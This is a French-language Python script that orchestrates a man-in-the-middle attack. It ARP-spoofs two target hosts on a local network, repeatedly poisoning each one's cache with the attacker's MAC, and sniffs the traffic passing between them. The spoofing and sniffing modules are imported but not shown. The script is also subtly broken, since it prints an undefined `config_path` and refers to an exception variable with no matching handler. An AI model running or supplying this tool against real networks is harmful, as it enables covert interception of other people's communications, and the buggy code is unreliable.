import get_mac_from_ip
import arp_spoofing
import sniffer
from scapy.all import get_if_hwaddr, get_if_addr
import asyncio
import os
import json

class MainInTheMiddle:
    def __init__(self, cible_1_ip, cible_2_ip, interface):
        self.cible_1 = get_mac_from_ip.Cible(cible_1_ip, interface)
        self.cible_2 = get_mac_from_ip.Cible(cible_2_ip, interface)
        self.interface = interface
        self.self_mac = get_if_hwaddr(interface)
        self.self_ip = get_if_addr(interface)

    async def start_mitm(self):
        spoof_client_1 = arp_spoofing.ArpSpoofing(self.cible_2.ip, self.cible_1.ip, self.self_mac, self.cible_1.mac, self.interface)
        spoof_client_2 = arp_spoofing.ArpSpoofing(self.cible_1.ip, self.cible_2.ip, self.self_mac, self.cible_2.mac, self.interface)
            
        t1 = asyncio.create_task(spoof_client_1.start_spoofing(interval=2.0))
        t2 = asyncio.create_task(spoof_client_2.start_spoofing(interval=2.0))
        t3 = asyncio.create_task(sniffer.Sniffer(self.interface, self.cible_1.mac, self.cible_2.mac).start_sniffing())

        try:
            await asyncio.gather(t1, t2, t3)
        except asyncio.CancelledError:
            t1.cancel()
            t2.cancel()
            t3.cancel()

def verif_ip(ip :str):
    octets = ip.split(".")
    if len(octets) != 4:
        return False
    for octet in octets:
        if not octet.isdigit():
            return False
        elif int(octet) < 0 or int(octet) > 255:
            return False
    return True

async def ihm() :
    while True :
        json_path = "config.json"
        if os.path.exists(json_path):
            with open(json_path, "r", encoding="utf-8") as f:
                json_data = json.load(f)
                c1 = json_data.get("cible_1_ip") or json_data.get("cible1_ip") or json_data.get("target1")
                c2 = json_data.get("cible_2_ip") or json_data.get("cible2_ip") or json_data.get("target2")
                iface = json_data.get("interface")
                if c1 and c2 and iface and verif_ip(c1) and verif_ip(c2):
                    cible_1_ip, cible_2_ip, interface = c1, c2, iface
                    print(f"Configuration chargée depuis {config_path}")
                    break
                else:
                    print("Fichier de configuration invalide ou incomplet — saisie manuelle requise.")

            #exemple de fichier json valide pour les nul en json :
            # {
            #     "cible_1_ip": "192.168.1.10",
            #     "cible_2_ip": "192.168.1.20",
            #     "interface": "eth0"
            # }
                
                print(f"Impossible de charger {config_path} : {e}")

        print("=================================menu=================================")
        
        cible_1_ip = input("Entrez l'adresse IP de la cible 1 : ")
        cible_2_ip = input("Entrez l'adresse IP de la cible 2 : ")
        interface = input("Entrez le nom de l'interface réseau à utiliser : ")

        if verif_ip(cible_1_ip) and verif_ip(cible_2_ip):
            break
    print("======================================================================")
    mitm = MainInTheMiddle(cible_1_ip, cible_2_ip, interface)
    await mitm.start_mitm()
    return mitm

if __name__ == "__main__":
    try:
        asyncio.run(ihm())
    except KeyboardInterrupt:
        print("Arrêt demandé par l'utilisateur")